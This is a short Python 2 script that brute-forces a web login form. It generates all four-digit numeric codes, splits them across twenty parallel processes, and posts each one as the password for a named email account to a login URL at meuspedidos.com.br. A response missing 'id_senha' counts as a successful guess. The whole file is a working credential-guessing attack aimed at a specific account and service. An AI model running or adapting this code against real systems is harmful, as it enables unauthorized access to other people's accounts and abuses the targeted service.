from itertools import combinations_with_replacement
from itertools import permutations
import urllib
import urllib2
import multiprocessing
import datetime
import sys
import time
from functools import wraps


def retry(ExceptionToCheck, tries=4, delay=3, backoff=2, logger=None):
    def deco_retry(f):

        @wraps(f)
        def f_retry(*args, **kwargs):
            mtries, mdelay = tries, delay
            while mtries > 1:
                try:
                    return f(*args, **kwargs)
                except ExceptionToCheck, e:
                    msg = "%s, Retrying in %d seconds..." % (str(e), mdelay)
                    if logger:
                        logger.warning(msg)
                    else:
                        print msg
                    time.sleep(mdelay)
                    mtries -= 1
                    mdelay *= backoff
            return f(*args, **kwargs)

        return f_retry  # true decorator

    return deco_retry

@retry(urllib2.URLError, tries=5, delay=3, backoff=2)
def urlopen_with_retry(request):
    return urllib2.urlopen(request)

def createSublists(elements, listCount):
    fullList = []
    nestedLists = []
    for c in combinations_with_replacement(elements, 4):
        for x in permutations(c, 4):
            fullList.append(''.join(x))
    fullList = list(set(fullList))
    fullListCount = len(fullList)
    fullSublistCount = fullListCount / listCount
    sublistCountDif = fullListCount % listCount
    minPos = 0 
    for x in range(listCount):
        maxPos = ((x+1)*fullSublistCount) 
        nestedLists.append(fullList[minPos:maxPos])
        minPos = maxPos  
    if minPos != fullListCount:
        maxPos = fullListCount
        nestedLists.append(fullList[minPos:maxPos])
    #print '[%s]' % ', '.join(map(str, nestedLists))
    print str(fullListCount) + ' possibilities'
    return nestedLists


def worker(passwords):
    for password in passwords:
        values = {'usuario' : 'angelo_ribeiro@me.com', 'senha' : password}
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        response = urlopen_with_retry(req)
        the_page = response.read()
        if 'id_senha' not in the_page:
            print 'yup! ' + password
            break
    print 'finish: ' + str(datetime.datetime.now().time())   

if __name__ == '__main__':

    url = 'http://sandbox.meuspedidos.com.br:8080/login/'
    lettersAndNumbers = ['1','2','3','4','5','6','7','8','9','0','q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m']
    numbers = ['0','1','2','3','4','5','6','7','8','9']
    single = ['1610']

    jobList = createSublists(numbers, 20)

    jobs = []
    print 'start: ' + str(datetime.datetime.now().time())
    for i in jobList:
        p = multiprocessing.Process(target=worker, args=(i,))
        jobs.append(p)
        p.start()

   
        



